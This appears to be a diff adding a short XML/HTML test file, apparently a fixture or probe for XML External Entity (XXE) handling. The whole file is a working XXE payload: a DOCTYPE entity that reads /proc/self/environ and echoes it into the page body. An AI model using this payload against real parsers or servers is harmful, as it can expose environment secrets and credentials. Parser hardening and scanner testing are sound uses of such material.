@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE html [<!ENTITY xxe SYSTEM "/proc/self/environ">]>
+<html>
+<head>
+<meta name="description" content="ZKV4"/>
+</head>
+<body><p>&xxe;</p></body>
+</html>
